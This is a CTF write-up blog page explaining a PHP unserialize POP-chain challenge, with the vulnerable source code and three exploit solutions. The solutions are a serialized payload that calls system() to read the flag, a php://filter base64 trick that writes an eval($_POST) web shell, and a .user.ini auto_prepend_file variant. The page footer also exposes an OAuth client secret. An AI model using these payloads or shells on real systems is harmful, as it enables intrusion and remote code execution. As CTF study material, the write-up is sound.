@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>[2020 新春红包题]反序列化pop链 |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="[2020 新春红包题]反序列化pop链 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="[2020 新春红包题]反序列化pop链"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/2020-xin-chun-hong-bao-ti-fan-xu-lie-hua-pop-lian/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[2020 新春红包题]反序列化pop链</h1>
+            <span class="meta">
+            	Posted on
+              2020-02-02，9 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>这题也是根据2019全国大学生安全运维赛 EZPOP改编的<br>
+具体代码如下</p>
+<pre><code>&lt;?php
+error_reporting(0);
+
+class A {
+
+    protected $store;
+
+    protected $key;
+
+    protected $expire;
+
+    public function __construct($store, $key = 'flysystem', $expire = null) {
+        $this-&gt;key = $key;
+        $this-&gt;store = $store;
+        $this-&gt;expire = $expire;
+    }
+
+    public function cleanContents(array $contents) {
+        $cachedProperties = array_flip([
+            'path', 'dirname', 'basename', 'extension', 'filename',
+            'size', 'mimetype', 'visibility', 'timestamp', 'type',
+        ]);
+
+        foreach ($contents as $path =&gt; $object) {
+            if (is_array($object)) {
+                $contents[$path] = array_intersect_key($object, $cachedProperties);
+            }
+        }
+
+        return $contents;
+    }
+
+    public function getForStorage() {
+        $cleaned = $this-&gt;cleanContents($this-&gt;cache);
+
+        return json_encode([$cleaned, $this-&gt;complete]);
+    }
+
+    public function save() {
+        $contents = $this-&gt;getForStorage();
+
+        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);
+    }
+
+    public function __destruct() {
+        if (!$this-&gt;autosave) {
+            $this-&gt;save();
+        }
+    }
+}
+
+class B {
+
+    protected function getExpireTime($expire): int {
+        return (int) $expire;
+    }
+
+    public function getCacheKey(string $name): string {
+        // 使缓存文件名随机
+        $cache_filename = $this-&gt;options['prefix'] . uniqid() . $name;
+        if(substr($cache_filename, -strlen('.php')) === '.php') {
+          die('?');
+        }
+        return $cache_filename;
+    }
+
+    protected function serialize($data): string {
+        if (is_numeric($data)) {
+            return (string) $data;
+        }
+
+        $serialize = $this-&gt;options['serialize'];
+
+        return $serialize($data);
+    }
+
+    public function set($name, $value, $expire = null): bool{
+        $this-&gt;writeTimes++;
+
+        if (is_null($expire)) {
+            $expire = $this-&gt;options['expire'];
+        }
+
+        $expire = $this-&gt;getExpireTime($expire);
+        $filename = $this-&gt;getCacheKey($name);
+
+        $dir = dirname($filename);
+
+        if (!is_dir($dir)) {
+            try {
+                mkdir($dir, 0755, true);
+            } catch (\Exception $e) {
+                // 创建失败
+            }
+        }
+
+        $data = $this-&gt;serialize($value);
+
+        if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) {
+            //数据压缩
+            $data = gzcompress($data, 3);
+        }
+
+        $data = &quot;&lt;?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+        $result = file_put_contents($filename, $data);
+
+        if ($result) {
+            return $filename;
+        }
+
+        return null;
+    }
+
+}
+
+if (isset($_GET['src']))
+{
+    highlight_file(__FILE__);
+}
+
+$dir = &quot;uploads/&quot;;
+
+if (!is_dir($dir))
+{
+    mkdir($dir);
+}
+unserialize($_GET[&quot;data&quot;]);
+</code></pre>
+<!-- more -->
+<p>反序列化漏洞。需要我们构造POP链。有两个类。A和B。看下代码<br>
+在B中 。发现了一个危险函数file_put_contents<br>
+<img src="https://guokeya.github.io/post-images/1580993471972.png" alt="" loading="lazy"><br>
+接收了两个参数<code>$filename,$data</code><br>
+追踪下<code>$filename</code></p>
+<p><img src="https://guokeya.github.io/post-images/1580993526423.png" alt="" loading="lazy"><br>
+<code>$filename = $this-&gt;getCacheKey($name);</code><br>
+<code>$name</code>是直接函数传参的。接着看getCacheKey这个函数是干啥的</p>
+<pre><code>public function getCacheKey(string $name): string {
+        // 使缓存文件名随机
+        $cache_filename = $this-&gt;options['prefix'] . uniqid() . $name;
+        if(substr($cache_filename, -strlen('.php')) === '.php') {
+          die('?');
+        }
+        return $cache_filename;
+    }
+</code></pre>
+<pre><code>$cache_filename=$this-&gt;options['prefix'].uniqid().$name组成随机的文件名。这里options['prefix']和$name可控。可以用../变成upload/1345235(uniqid)/../1.php
+判断$cache_filename文件名最后三位是否是php结尾
+这里可以用1.php/.绕过
+file_put_contents('1.php/.','123')会生成1.php而不是1.php/.
+</code></pre>
+<p>ok。那么B类中的set函数怎么调用和传参呢。接着看<br>
+<img src="https://guokeya.github.io/post-images/1580995316969.png" alt="" loading="lazy"><br>
+在A类中。我们发现了一个save()函数。会调用<code>store-&gt;set</code>。<br>
+可以将<code>$this-&gt;store</code>赋值为class B<br>
+接着就会调用B类中的set函数。<br>
+而save函数由析构函数自动调用<br>
+接下来看看对应传入的<code>$this-&gt;key(B类中的文件名)</code></p>
+<pre><code>    public function __construct($store, $key = 'flysystem', $expire = null) {
+        $this-&gt;key = $key;
+        $this-&gt;store = $store;
+        $this-&gt;expire = $expire;
+    }
+</code></pre>
+<p>通过反序列化传参。<br>
+1。那么通过反序列化赋值$this-&gt;key为../1.php/.</p>
+<p>2。析构函数会调用<code>$this-&gt;save</code>函数。我们通过反序列化将store=class B()<br>
+就能调用B类中的set函数。然后将<code>$this-&gt;key</code>传入<br>
+3。将传入的key定义为<code>$name</code>。传入B类的getCacheKey函数<br>
+4。<code>$this-&gt;options['prefix'] . uniqid() . $name</code>生成随机文件名uploads/48342/../1.php/.会在uploads目录生成1.php。<br>
+并且判断后缀名。返回为$filename<br>
+5。传入file_put_contents函数<br>
+文件名已经搞定了。接下来看文件内容</p>
+<p><img src="https://guokeya.github.io/post-images/1580993741722.png" alt="" loading="lazy"><br>
+<code>$data</code>经过<code>$this-&gt;serialize</code>函数。然后拼接写入<br>
+看下serialize函数</p>
+<pre><code>    protected function serialize($data): string {
+        if (is_numeric($data)) {
+            return (string) $data;
+        }
+
+        $serialize = $this-&gt;options['serialize'];
+
+        return $serialize($data);
+    }
+</code></pre>
+<p><code>$this-&gt;options['serialize']</code>可以通过反序列化修改。然后返回<code>$serialize($data)</code><br>
+可以执行<code>system($data)</code>。继续看<code>$data</code>的来源<br>
+通过set函数传参。</p>
+<p><img src="https://guokeya.github.io/post-images/1580994010818.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1580994103632.png" alt="" loading="lazy"><br>
+<code>$contents</code>通过<code>$this-&gt;getForStorage()</code>传参。<br>
+getForStorage()函数。又通过<code>cleanContents($this-&gt;cache)</code><br>
+找到来源了。<code>$this-&gt;cache</code>就是原始数据<br>
+经过cleanContents处理。然后再json_encode转换。赋值<code>$contents</code>给set函数。经过<code>$serialize</code>处理。拼接传入file_put_contens。<br>
+流程搞懂了。看具体操作<br>
+首先看cleanContents函数。接收一个数组。返回。。还是那个数组。只有传入二维数组时。才会进行处理<br>
+<img src="https://guokeya.github.io/post-images/1580994299270.png" alt="" loading="lazy"><br>
+接下来就会经过json转换。json_encode好像并没有什么参数。看了下手册。第二个参数转义用的。好像对我们并没有什么帮助。代码也没赋值。就先不设置<br>
+<img src="https://guokeya.github.io/post-images/1580641104242.png" alt="" loading="lazy"></p>
+<pre><code>array('test'=&gt;'abc')----&gt;[{&quot;test&quot;:&quot;abc&quot;},null]
+</code></pre>
+<p>然后进入serialize。我们可以反序列化为system函数就执行了</p>
+<pre><code>system([{&quot;test&quot;:&quot;abc&quot;},null])
+</code></pre>
+<p>不知道能不能执行。本地执行一下<br>
+<img src="https://guokeya.github.io/post-images/1580994801447.png" alt="" loading="lazy"><br>
+发现是可以执行的。那还写个锤子shell。直接这里执行命令<br>
+得到flag在/flag。直接读取就好了<br>
+下面构造payload</p>
+<pre><code>class A{
+    protected $store;
+    protected $key;
+    public $cache = [];
+    public function __construct () {
+        $this-&gt;store = new B();
+        $this-&gt;key = '1';
+        $this-&gt;cache = array('a'=&gt;'`cat /flag &gt; ./uploads/flag.php`');
+    }
+}
+
+class B{
+    public $options = [
+        'serialize' =&gt; 'system'
+    ];	
+}
+
+echo urlencode(serialize(new A()));
+</code></pre>
+<p>这里读取flag。放到flag.php中<br>
+关于A类中的文件名。为什么要设置呢。主要是为了满足函数的string类型。不然会报错。直接停止运行。下面的serialize就执行不了<br>
+<img src="https://guokeya.github.io/post-images/1580994860016.png" alt="" loading="lazy"></p>
+<pre><code>http://2a3a00d9-b06b-46b8-93a6-f3ef6701e7af.node3.buuoj.cn/?data=O%3A1%3A%22A%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A1%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A1%3A%221%22%3Bs%3A5%3A%22cache%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A32%3A%22%60cat+%2Fflag+%3E+.%2Fuploads%2Fflag.php%60%22%3B%7D%7D
+</code></pre>
+<p>访问uploads/flag.php成功拿到flag<br>
+<strong>第二种解法：利用base64逃逸拼接内容</strong><br>
+继续跟着上面的思路。这里不用system函数了。而是继续使用serialize</p>
+<pre><code>array('test'=&gt;'abc')----&gt;s:21:&quot;[{&quot;test&quot;:&quot;abc&quot;},null]&quot;;
+</code></pre>
+<p>拼接后生成如下。php有个exit()。那么后面无论写什么都不会执行。我们得想办法把exit()给弄掉<br>
+<img src="https://guokeya.github.io/post-images/1580994942050.png" alt="" loading="lazy"><br>
+file_put_contents支持php伪协议。那么我们通过伪协议。将exit或者<??>给破坏掉。就行了<br>
+<img src="https://guokeya.github.io/post-images/1580995044875.png" alt="" loading="lazy"><br>
+php的base64会将可解析的字符继续解密。a-zA-Z0-9/=+。而;&lt;&gt;这些就会自动忽略。<br>
+文件名可控。那么我们只需要将文件名设置为<br>
+php://filter/write=convert.base64-decode/resource=uploads/12432/../a.php/.<br>
+就能在uploads生成一个a.php。<br>
+内容为base64编码过的一句话木马。<br>
+通过base64可以成功解码。而前面的exit就没了<br>
+<img src="https://guokeya.github.io/post-images/1580995167542.png" alt="" loading="lazy"><br>
+由于base64解密需要能整除4。我们上面的代码转换base64能识别的字符如下<br>
+刚好能整除4。不能整除4.就不能正常解密<br>
+<img src="https://guokeya.github.io/post-images/1580995223324.png" alt="" loading="lazy"><br>
+以下是payload</p>
+<pre><code>&lt;?php
+class A{
+    protected $store;
+    protected $key;
+    public $cache;
+    public function __construct () {
+        $this-&gt;store = new B();
+        $this-&gt;key = '/../shell.php/.';
+        $this-&gt;cache = array('path'=&gt;'a','dirname'=&gt;base64_encode('&lt;?php eval($_POST[a]);?&gt;'));
+        
+    }
+}
+
+class B{
+    public $options = [
+        'serialize' =&gt; 'serialize',
+        'prefix' =&gt; 'php://filter/write=convert.base64-decode/resource=uploads/',
+    ];
+}
+
+echo urlencode(serialize(new A()));
+</code></pre>
+<p>由于文件名是由$this-&gt;options['prefix'] . uniqid() . $name组成。所以。我们构造以上的exp效果如下<br>
+<code>php://filter/write=convert.base64-decode/resource=uploads/47881(随机数)/../shell.php/.</code><br>
+执行完。就会在uplaods目录下生成shell.php<br>
+解法三：<br>
+利用.user.ini</p>
+<pre><code>&lt;?php
+class A{
+    protected $store;
+    protected $key;
+    protected $expire;
+    public $cache;
+    public function __construct () {
+        $this-&gt;store = new B();
+        $this-&gt;key = '/../../shell.pHp';
+        $this-&gt;cache = array('path'=&gt;'a','dirname'=&gt;base64_encode('&lt;?php eval($_POST[a]);?&gt;'));
+    }
+}
+
+class B{
+    public $options = [
+        'serialize' =&gt; 'serialize',
+        'prefix' =&gt; 'php://filter/write=convert.base64-decode/resource=uploads/',
+    ];
+}
+
+echo urlencode(serialize(new A()));
+</code></pre>
+<pre><code>&lt;?php
+class A{
+    protected $store;
+    protected $key;
+    public $cache;
+    public function __construct () {
+        $this-&gt;store = new B();
+        $this-&gt;key = '/../../.user.ini';
+        $this-&gt;cache = array('path'=&gt;'a','dirname'=&gt;base64_encode('1'.&quot;\n&quot;.'auto_prepend_file=shell.pHp'.&quot;\n\n\n\n&quot;));
+    }
+}
+
+class B{
+    public $options = [
+        'serialize' =&gt; 'serialize',
+        'prefix' =&gt; 'php://filter/write=convert.base64-decode/resource=uploads/',
+    ];
+}
+
+echo urlencode(serialize(new A()));
+</code></pre>
+<p>这和解法二思路差不多。都是写文件。只不过<br>
+解法二。利用/.绕过后缀名限制。直接写php<br>
+这里通过pHp+.user.ini绕过后缀名限制</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/xnuca2019qualifiereasyphphtaccess-li-yong/">
+              <span class="post-title">
+                [XNUCA2019Qualifier]EasyPHP(.htaccess利用)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
